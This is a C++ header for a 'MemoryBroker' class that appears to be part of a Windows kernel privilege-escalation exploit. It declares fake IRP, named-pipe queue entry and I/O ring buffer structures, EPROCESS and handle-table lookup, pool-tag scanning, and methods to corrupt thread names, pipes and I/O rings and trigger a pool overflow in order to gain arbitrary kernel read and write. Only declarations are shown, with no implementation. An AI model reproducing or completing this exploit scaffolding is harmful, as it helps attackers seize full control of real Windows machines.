#pragma once
#include "includes.h"
#include "functions.h"
#include "poolObjects.h"
#include <memory>
#include <optional>
#include <vector>

// Bounded, non-blocking read tuning for MemoryBroker::Read
#ifndef MB_READ_RETRY_LIMIT
#define MB_READ_RETRY_LIMIT 8
#endif
#ifndef MB_READ_RETRY_DELAY_MS
#define MB_READ_RETRY_DELAY_MS 1
#endif
#ifndef MB_READ_MAX_BUDGET_MS
#define MB_READ_MAX_BUDGET_MS 40
#endif


class MemoryBroker
{

private:

	BYTE* tmpData;
	IRP* fakeIRP;
	LFH_NP_DATA_QUEUE_ENTRY* fakePipeMessage;
	IOP_MC_BUFFER_ENTRY* fakeRegBuffer;


	pNtFsControlFile _NtFsControlFile;
	UINT64 HANDLE_TABLE;
	UINT64 TABLE_CODE;
	UINT64 EPROCESS;

	UINT64 targetRingAddr;
	UINT64 regBuffersListAddr;

	UINT64 buildNumber = 0;
	bool readEnabled = false;
	bool writeEnabled = false;
	bool pipeNowaitSet = false;
	
public:
	MemoryBroker();
    // External managers are referenced via weak_ptr to avoid owning them and
	// to validate lifetime before use.
	void SetPipeManager(std::shared_ptr<class PipeManager> pm) { pipeManager = pm; }
	void SetIoRingManager(std::shared_ptr<class IORingManager> irm) { ioRingManager = irm; }
	void SetNameManager(std::shared_ptr<class ThreadNameManager> nm) { nameManager = nm; }

	bool ReadEnabled();
	bool WriteEnabled();

	std::weak_ptr<class PipeManager> pipeManager;
	std::weak_ptr<class IORingManager> ioRingManager;
	std::weak_ptr<class ThreadNameManager> nameManager;


	void CreateFakeIRP();
	void CreateFakeRegBuffer(BYTE* seedData);
	void Read(UINT64* iDestinationAddr, UINT64 iTargetAddr, UINT64 iSize);
	void Write(BYTE* iDestinationAddr, UINT64 data, UINT64 size);



	bool FindEPROCESS(UINT64 iClientManager);
	UINT64 GetEPROCESS();

    struct LeakLayoutResult {
		std::vector<BYTE> leakedData;
        UINT64 targetPipeOffset;
		UINT32 pipeIndex = 0;
	};

	std::optional<LeakLayoutResult> GetPipeLayout();
	
	bool GetIORingLayout();

	bool CorruptThreadName();
	bool CorruptPipe();
	bool CorruptIoRing();

	bool Cleanup();


	UINT64 HandleToPointer(HANDLE iHandle);
	bool EnumVersion();
	UINT64 GetOffset(std::string structName, std::string memberName);
	std::vector<UINT64> ScanForPoolTag(const BYTE* data, size_t size, const char* tag);

    // Helper to call the global Hvergelmir PrimeOverflow callback via singleton
	void InvokePrimeOverflow(UINT64 count);
    void InvokeTriggerOverflow(BYTE* buf, UINT64 size);
	void InvokePassOverflow();
};
